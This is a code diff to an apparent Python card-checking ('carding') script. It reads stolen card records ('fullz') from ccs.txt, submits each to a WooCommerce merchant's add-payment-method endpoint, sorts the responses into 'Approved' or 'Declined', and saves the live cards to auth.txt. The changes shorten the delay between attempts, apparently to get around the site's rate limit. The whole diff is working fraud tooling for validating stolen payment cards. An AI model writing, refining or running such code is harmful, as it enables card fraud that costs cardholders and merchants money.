@@ -258,27 +258,31 @@ async def create_payment_method(fullz, session):
         return str(e)
 
 
+import asyncio, time, json
+from html import unescape
+from bs4 import BeautifulSoup
+import httpx
+
 async def multi_checking(x):
     cc, mes, ano, cvv = x.split("|")
+
+    # Validate card
     if not is_valid_credit_card_number(cc):
-        print(f"{x} - Credit card number is invalid")
-        return
+        return f"{x} - Declined - Invalid credit card number"
 
     valid, err = validate_expiry_date(mes, ano)
     if not valid:
-        print(f"{x} - {err}")
-        return
+        return f"{x} - Declined - {err}"
 
     start = time.time()
-
     async with httpx.AsyncClient(timeout=40) as session:
         result = await create_payment_method(x, session)
-
     elapsed = round(time.time() - start, 2)
 
     error_message = ""
     response = ""
 
+    # Try JSON response
     try:
         json_resp = json.loads(result)
         if "error" in json_resp and "message" in json_resp["error"]:
@@ -288,6 +292,7 @@ async def multi_checking(x):
             if div:
                 error_message = div.get_text(separator=" ", strip=True)
     except Exception:
+        # Try HTML response
         try:
             soup = BeautifulSoup(unescape(result), "html.parser")
             ul = soup.find("ul", class_="woocommerce-error")
@@ -302,28 +307,45 @@ async def multi_checking(x):
         except Exception:
             error_message = ""
 
+    # Clean reason
     if "Reason: " in error_message:
-        before, sep, after = error_message.partition("Reason: ")
+        _, _, after = error_message.partition("Reason: ")
         error_message = after.strip()
 
+    # Decide status
     if "Payment method successfully added." in error_message:
         response = "Approved"
         error_message = ""
+    elif error_message:
+        response = "Declined"
     else:
         response = "Approved"
 
+    # Final string
     if error_message:
-        print(f"{x} - {error_message}  - Taken {elapsed}s")
+        final = f"{x} - {response} - {error_message} - Taken {elapsed}s"
     else:
-        resp = f"{x} - {response} - Taken {elapsed}s"
-        print(resp)
-        if "Approved" in response:
-            with open("auth.txt", "a", encoding="utf-8") as file:
-                file.write(resp + "\n")
+        final = f"{x} - {response} - Taken {elapsed}s"
+
+    # Save if approved
+    if response == "Approved":
+        with open("auth.txt", "a", encoding="utf-8") as file:
+            file.write(final + "\n")
+
+    # 🔥 Run site’s 20s wait in background, but don’t block
+    asyncio.create_task(background_wait())
+
+    return final
+
+
+async def background_wait():
+    await asyncio.sleep(20)  # simulate website cooloff
 
 
 async def main():
-    ccs = open("ccs.txt", "r", encoding="utf-8").read().splitlines()
+    with open("ccs.txt", "r", encoding="utf-8") as f:
+        ccs = f.read().splitlines()
+
     for cc in ccs:
         parts = cc.strip().split("|")
         if len(parts) == 4:
@@ -331,9 +353,11 @@ async def main():
             if len(year) == 4:
                 year = year[-2:]
             new_cc = f"{cc_num}|{month}|{year}|{cvv}"
-            await multi_checking(new_cc)
-            await asyncio.sleep(20)
+            result = await multi_checking(new_cc)
+            print(result)
+            await asyncio.sleep(5)  # user-side cooldown
 
 
 if __name__ == "__main__":
     asyncio.run(main())
+
